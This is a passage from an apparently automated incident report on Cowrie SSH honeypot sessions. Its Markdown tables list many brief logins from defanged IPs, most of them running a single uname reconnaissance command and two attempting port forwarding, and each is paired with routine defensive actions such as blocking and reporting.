| `2026-07-04 19:04:29` | `cowrie.login.success` |
| `2026-07-04 19:04:30` | `cowrie.session.params` |
| `2026-07-04 19:04:30` | `cowrie.command.input` |
| `2026-07-04 19:04:30` | `cowrie.log.closed` |
| `2026-07-04 19:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78a5db0cb909

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:34` | `cowrie.session.connect` |
| `2026-07-04 19:04:34` | `cowrie.client.version` |
| `2026-07-04 19:04:35` | `cowrie.client.kex` |
| `2026-07-04 19:04:35` | `cowrie.login.success` |
| `2026-07-04 19:04:36` | `cowrie.session.params` |
| `2026-07-04 19:04:36` | `cowrie.command.input` |
| `2026-07-04 19:04:36` | `cowrie.log.closed` |
| `2026-07-04 19:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2863325162b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:40` | `cowrie.session.connect` |
| `2026-07-04 19:04:40` | `cowrie.client.version` |
| `2026-07-04 19:04:40` | `cowrie.client.kex` |
| `2026-07-04 19:04:41` | `cowrie.login.success` |
| `2026-07-04 19:04:42` | `cowrie.session.params` |
| `2026-07-04 19:04:42` | `cowrie.command.input` |
| `2026-07-04 19:04:42` | `cowrie.log.closed` |
| `2026-07-04 19:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f085e884ca26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:45` | `cowrie.session.connect` |
| `2026-07-04 19:04:46` | `cowrie.client.version` |
| `2026-07-04 19:04:46` | `cowrie.client.kex` |
| `2026-07-04 19:04:46` | `cowrie.login.success` |
| `2026-07-04 19:04:47` | `cowrie.session.params` |
| `2026-07-04 19:04:47` | `cowrie.command.input` |
| `2026-07-04 19:04:47` | `cowrie.log.closed` |
| `2026-07-04 19:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f7ce6895bcc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:51` | `cowrie.session.connect` |
| `2026-07-04 19:04:51` | `cowrie.client.version` |
| `2026-07-04 19:04:51` | `cowrie.client.kex` |
| `2026-07-04 19:04:52` | `cowrie.login.success` |
| `2026-07-04 19:04:53` | `cowrie.session.params` |
| `2026-07-04 19:04:53` | `cowrie.command.input` |
| `2026-07-04 19:04:53` | `cowrie.log.closed` |
| `2026-07-04 19:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df35e2885809

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:04 |
| **Last Seen** | 2026-07-04 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:04:57` | `cowrie.session.connect` |
| `2026-07-04 19:04:57` | `cowrie.client.version` |
| `2026-07-04 19:04:57` | `cowrie.client.kex` |
| `2026-07-04 19:04:57` | `cowrie.login.success` |
| `2026-07-04 19:04:58` | `cowrie.session.params` |
| `2026-07-04 19:04:58` | `cowrie.command.input` |
| `2026-07-04 19:04:58` | `cowrie.log.closed` |
| `2026-07-04 19:04:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ed2a12636b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:02` | `cowrie.session.connect` |
| `2026-07-04 19:05:02` | `cowrie.client.version` |
| `2026-07-04 19:05:02` | `cowrie.client.kex` |
| `2026-07-04 19:05:03` | `cowrie.login.success` |
| `2026-07-04 19:05:04` | `cowrie.session.params` |
| `2026-07-04 19:05:04` | `cowrie.command.input` |
| `2026-07-04 19:05:04` | `cowrie.log.closed` |
| `2026-07-04 19:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a46b158d65

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:07` | `cowrie.session.connect` |
| `2026-07-04 19:05:07` | `cowrie.client.version` |
| `2026-07-04 19:05:07` | `cowrie.client.kex` |
| `2026-07-04 19:05:08` | `cowrie.login.success` |
| `2026-07-04 19:05:09` | `cowrie.session.params` |
| `2026-07-04 19:05:09` | `cowrie.command.input` |
| `2026-07-04 19:05:09` | `cowrie.log.closed` |
| `2026-07-04 19:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a5fbe2ea79

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:13` | `cowrie.session.connect` |
| `2026-07-04 19:05:13` | `cowrie.client.version` |
| `2026-07-04 19:05:13` | `cowrie.client.kex` |
| `2026-07-04 19:05:13` | `cowrie.login.success` |
| `2026-07-04 19:05:14` | `cowrie.session.params` |
| `2026-07-04 19:05:14` | `cowrie.command.input` |
| `2026-07-04 19:05:15` | `cowrie.log.closed` |
| `2026-07-04 19:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d007404236

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:18` | `cowrie.session.connect` |
| `2026-07-04 19:05:18` | `cowrie.client.version` |
| `2026-07-04 19:05:18` | `cowrie.client.kex` |
| `2026-07-04 19:05:19` | `cowrie.login.success` |
| `2026-07-04 19:05:20` | `cowrie.session.params` |
| `2026-07-04 19:05:20` | `cowrie.command.input` |
| `2026-07-04 19:05:20` | `cowrie.log.closed` |
| `2026-07-04 19:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4464f04764

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:24` | `cowrie.session.connect` |
| `2026-07-04 19:05:24` | `cowrie.client.version` |
| `2026-07-04 19:05:24` | `cowrie.client.kex` |
| `2026-07-04 19:05:25` | `cowrie.login.success` |
| `2026-07-04 19:05:26` | `cowrie.session.params` |
| `2026-07-04 19:05:26` | `cowrie.command.input` |
| `2026-07-04 19:05:26` | `cowrie.log.closed` |
| `2026-07-04 19:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844abc1c75f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:29` | `cowrie.session.connect` |
| `2026-07-04 19:05:29` | `cowrie.client.version` |
| `2026-07-04 19:05:29` | `cowrie.client.kex` |
| `2026-07-04 19:05:30` | `cowrie.login.success` |
| `2026-07-04 19:05:30` | `cowrie.session.params` |
| `2026-07-04 19:05:30` | `cowrie.command.input` |
| `2026-07-04 19:05:31` | `cowrie.log.closed` |
| `2026-07-04 19:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083b879f772a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:34` | `cowrie.session.connect` |
| `2026-07-04 19:05:35` | `cowrie.client.version` |
| `2026-07-04 19:05:35` | `cowrie.client.kex` |
| `2026-07-04 19:05:35` | `cowrie.login.success` |
| `2026-07-04 19:05:36` | `cowrie.session.params` |
| `2026-07-04 19:05:36` | `cowrie.command.input` |
| `2026-07-04 19:05:36` | `cowrie.log.closed` |
| `2026-07-04 19:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89707b41803

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:40` | `cowrie.session.connect` |
| `2026-07-04 19:05:40` | `cowrie.client.version` |
| `2026-07-04 19:05:40` | `cowrie.client.kex` |
| `2026-07-04 19:05:41` | `cowrie.login.success` |
| `2026-07-04 19:05:42` | `cowrie.session.params` |
| `2026-07-04 19:05:42` | `cowrie.command.input` |
| `2026-07-04 19:05:42` | `cowrie.log.closed` |
| `2026-07-04 19:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd985bf26c39

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:42` | `cowrie.session.connect` |
| `2026-07-04 19:05:42` | `cowrie.client.version` |
| `2026-07-04 19:05:42` | `cowrie.client.kex` |
| `2026-07-04 19:05:42` | `cowrie.login.success` |
| `2026-07-04 19:05:42` | `cowrie.direct-tcpip.request` |
| `2026-07-04 19:05:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-04 19:05:42` | `cowrie.direct-tcpip.data` |
| `2026-07-04 19:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924d380ab5a7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:43` | `cowrie.session.connect` |
| `2026-07-04 19:05:43` | `cowrie.client.version` |
| `2026-07-04 19:05:43` | `cowrie.client.kex` |
| `2026-07-04 19:05:43` | `cowrie.login.success` |
| `2026-07-04 19:05:43` | `cowrie.direct-tcpip.request` |
| `2026-07-04 19:05:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-04 19:05:43` | `cowrie.direct-tcpip.data` |
| `2026-07-04 19:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53069425b4f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:45` | `cowrie.session.connect` |
| `2026-07-04 19:05:45` | `cowrie.client.version` |
| `2026-07-04 19:05:46` | `cowrie.client.kex` |
| `2026-07-04 19:05:46` | `cowrie.login.success` |
| `2026-07-04 19:05:47` | `cowrie.session.params` |
| `2026-07-04 19:05:47` | `cowrie.command.input` |
| `2026-07-04 19:05:47` | `cowrie.log.closed` |
| `2026-07-04 19:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06577a748a8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:51` | `cowrie.session.connect` |
| `2026-07-04 19:05:51` | `cowrie.client.version` |
| `2026-07-04 19:05:51` | `cowrie.client.kex` |
| `2026-07-04 19:05:51` | `cowrie.login.success` |
| `2026-07-04 19:05:52` | `cowrie.session.params` |
| `2026-07-04 19:05:52` | `cowrie.command.input` |
| `2026-07-04 19:05:52` | `cowrie.log.closed` |
| `2026-07-04 19:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd983acb579

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:05 |
| **Last Seen** | 2026-07-04 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:05:56` | `cowrie.session.connect` |
| `2026-07-04 19:05:56` | `cowrie.client.version` |
| `2026-07-04 19:05:56` | `cowrie.client.kex` |
| `2026-07-04 19:05:57` | `cowrie.login.success` |
| `2026-07-04 19:05:58` | `cowrie.session.params` |
| `2026-07-04 19:05:58` | `cowrie.command.input` |
| `2026-07-04 19:05:58` | `cowrie.log.closed` |
| `2026-07-04 19:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e854b29cc7df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:01` | `cowrie.session.connect` |
| `2026-07-04 19:06:02` | `cowrie.client.version` |
| `2026-07-04 19:06:02` | `cowrie.client.kex` |
| `2026-07-04 19:06:02` | `cowrie.login.success` |
| `2026-07-04 19:06:03` | `cowrie.session.params` |
| `2026-07-04 19:06:03` | `cowrie.command.input` |
| `2026-07-04 19:06:03` | `cowrie.log.closed` |
| `2026-07-04 19:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0f2acce6b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:07` | `cowrie.session.connect` |
| `2026-07-04 19:06:07` | `cowrie.client.version` |
| `2026-07-04 19:06:07` | `cowrie.client.kex` |
| `2026-07-04 19:06:08` | `cowrie.login.success` |
| `2026-07-04 19:06:09` | `cowrie.session.params` |
| `2026-07-04 19:06:09` | `cowrie.command.input` |
| `2026-07-04 19:06:09` | `cowrie.log.closed` |
| `2026-07-04 19:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a16a4c1fd413

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:12` | `cowrie.session.connect` |
| `2026-07-04 19:06:12` | `cowrie.client.version` |
| `2026-07-04 19:06:13` | `cowrie.client.kex` |
| `2026-07-04 19:06:13` | `cowrie.login.success` |
| `2026-07-04 19:06:14` | `cowrie.session.params` |
| `2026-07-04 19:06:14` | `cowrie.command.input` |
| `2026-07-04 19:06:14` | `cowrie.log.closed` |
| `2026-07-04 19:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce545cb8aa6a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:18` | `cowrie.session.connect` |
| `2026-07-04 19:06:18` | `cowrie.client.version` |
| `2026-07-04 19:06:18` | `cowrie.client.kex` |
| `2026-07-04 19:06:19` | `cowrie.login.success` |
| `2026-07-04 19:06:19` | `cowrie.session.params` |
| `2026-07-04 19:06:19` | `cowrie.command.input` |
| `2026-07-04 19:06:20` | `cowrie.log.closed` |
| `2026-07-04 19:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e609416670bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:24` | `cowrie.session.connect` |
| `2026-07-04 19:06:24` | `cowrie.client.version` |
| `2026-07-04 19:06:24` | `cowrie.client.kex` |
| `2026-07-04 19:06:24` | `cowrie.login.success` |
| `2026-07-04 19:06:25` | `cowrie.session.params` |
| `2026-07-04 19:06:25` | `cowrie.command.input` |
| `2026-07-04 19:06:25` | `cowrie.log.closed` |
| `2026-07-04 19:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d05ed27df8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:28` | `cowrie.session.connect` |
| `2026-07-04 19:06:29` | `cowrie.client.version` |
| `2026-07-04 19:06:29` | `cowrie.client.kex` |
| `2026-07-04 19:06:29` | `cowrie.login.success` |
| `2026-07-04 19:06:30` | `cowrie.session.params` |
| `2026-07-04 19:06:30` | `cowrie.command.input` |
| `2026-07-04 19:06:30` | `cowrie.log.closed` |
| `2026-07-04 19:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e359b018f21b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 19:06 |
| **Last Seen** | 2026-07-04 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 19:06:34` | `cowrie.session.connect` |
| `2026-07-04 19:06:34` | `cowrie.client.version` |
| `2026-07-04 19:06:34` | `cowrie.client.kex` |
| `2026-07-04 19:06:35` | `cowrie.login.success` |
| `2026-07-04 19:06:36` | `cowrie.session.params` |
| `2026-07-04 19:06:36` | `cowrie.command.input` |
| `2026-07-04 19:06:36` | `cowrie.log.closed` |
| `2026-07-04 19:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
